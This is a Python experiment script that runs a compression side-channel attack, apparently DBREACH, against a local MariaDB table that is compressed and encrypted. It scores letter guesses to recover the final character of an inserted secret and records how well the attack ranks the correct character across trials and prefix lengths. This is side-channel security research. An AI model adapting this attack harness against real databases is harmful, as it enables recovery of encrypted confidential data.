import utils.mariadb_utils as utils
import dbreacher
import dbreacher_impl
import k_of_n_attacker
import random
import string
import statistics
import time

maxRowSize = 200

control = utils.MariaDBController("testdb")

table = "victimtable"

prefix_len_to_poses = dict()
for prefix_len in range(10, 21):
    prefix_len_to_poses[prefix_len] = dict()
    for i in range(20):
        prefix_len_to_poses[prefix_len][i] = []

prefix_len_to_poses_new = dict()
for prefix_len in range(10, 21):
    prefix_len_to_poses_new[prefix_len] = dict()
    for i in range(20):
        prefix_len_to_poses_new[prefix_len][i] = []

for trial in range(10):
    print("trial = " + str(trial))
    for prefix_len in range(12, 21):
        print("prefix len = " + str(prefix_len))
        known_prefix = ''.join(random.choices(string.ascii_lowercase, k=prefix_len)) 

        possibilities = []
        for c in string.ascii_lowercase:
            possibilities.append(known_prefix + c)

        num_secrets = 1
        secret = random.choice(possibilities)
        correct_char = secret[-1]
        print(secret + "; " + correct_char)

        scores = dict()
        scores_new = dict()
        for c in string.ascii_lowercase:
            scores[c] = 0
            scores_new[c] = 0
        i = 0

        control.drop_table(table)
        time.sleep(1)
        control.create_basic_table(table,
                varchar_len=maxRowSize,
                compressed=True,
                encrypted=True)
        control.insert_row(table, 0, secret)
        dbreacher = dbreacher_impl.DBREACHerImpl(control, table, num_secrets, maxRowSize, string.printable.replace(string.ascii_lowercase, '').replace('*', ''), ord('*'))

        attacker = k_of_n_attacker.kOfNAttacker(len(string.ascii_lowercase), dbreacher, possibilities, True)
        while i < 20:
            success = attacker.setUp()
            if not success:
                print("Retrying setup")
                continue
            else:
                successful = attacker.tryAllGuesses(verbose = False)
                if not successful:
                    continue
                winners = attacker.getTopKGuesses()
                winners_by_bytes_to_shrink = [(round(1/s), g) for (s, g) in winners]
                top_score = winners_by_bytes_to_shrink[0][0]
                normalized = [(b - top_score, g[len(g) - 1]) for (b, g) in winners_by_bytes_to_shrink]
                for (b, c) in normalized:
                    scores[c] += b
                
                scores_new[normalized[0][1]] += abs(normalized[0][0] - normalized[1][0])
                scores_new[normalized[-1][1]] += abs(normalized[-1][0] - normalized[-2][0])
                leaderboard = [(b, c) for (c, b) in scores.items()]
                leaderboard.sort()
                
                # get position of correct char
                scores_to_chars = dict()
                for b, c in leaderboard:
                    if b in scores_to_chars:
                        scores_to_chars[b].add(c)
                    else:
                        scores_to_chars[b] = set([c])

                keys = [b for (b, l) in scores_to_chars.items()]
                keys.sort()
                place = 0
                points_behind = 0
                points_ahead = 0
                for key in keys:
                    if correct_char not in scores_to_chars[key]:
                        place += len(scores_to_chars[key])
                    if correct_char in scores_to_chars[key]:
                        position = statistics.mean([place + 1 + i for i in range(len(scores_to_chars[key]))])
                        place = position
                        points_behind = key - keys[0]
                        points_ahead = 0
                        if len(keys) > 1:
                            points_ahead = keys[1] - keys[0]
                        prefix_len_to_poses[prefix_len][i].append((position, points_behind, points_ahead))
                        break
                print ("run = " + str(i) + "; OLD pos = " + str(place) + "; points behind = " + str(points_behind) + "; points ahead = " + str(points_ahead))

                leaderboard_new = [(b, c) for (c, b) in scores_new.items()]
                leaderboard_new.sort(reverse=True)

                # get position of correct char
                scores_new_to_chars = dict()
                for b, c in leaderboard_new:
                    if b in scores_new_to_chars:
                        scores_new_to_chars[b].add(c)
                    else:
                        scores_new_to_chars[b] = set([c])

                keys = [b for (b, l) in scores_new_to_chars.items()]
                keys.sort(reverse=True)
                place = 0
                for key in keys:
                    if correct_char not in scores_new_to_chars[key]:
                        place += len(scores_new_to_chars[key])
                    if correct_char in scores_new_to_chars[key]:
                        position = statistics.mean([place + 1 + i for i in range(len(scores_new_to_chars[key]))])
                        place = position
                        points_behind = key - keys[0]
                        points_ahead = 0
                        if len(keys) > 1:
                            points_ahead = keys[1] - keys[0]
                        prefix_len_to_poses_new[prefix_len][i].append((position, points_behind, points_ahead))
                        break
                print ("run = " + str(i) + "; NEW pos = " + str(place) + "; points behind = " + str(points_behind) + "; points ahead = " + str(points_ahead))
                
                print(normalized)


                if normalized[-1][0] > 50:
                    time.sleep(10)

                i += 1

        print(prefix_len_to_poses)
        print("")
        print(prefix_len_to_poses_new)

